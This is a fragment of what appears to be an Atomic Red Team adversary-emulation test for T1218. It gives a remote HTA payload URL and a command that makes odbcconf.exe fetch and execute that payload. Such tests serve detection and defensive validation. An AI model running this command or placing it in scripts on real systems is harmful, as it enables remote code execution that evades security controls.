...
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| hta_payload | HTA to execute | Path | https://github.com/BluePytools/atomic-red-team/blob/master/atomics/T1218/src/T1218.hta|

#### Run it with `command_prompt`!
```
C:\>odbcconf /s /a {installdriver T1218|T1218=https://github.com/BluePytools/atomic-red-team/blob/master/atomics/T1218/src/T1218.hta}
```
<br/>
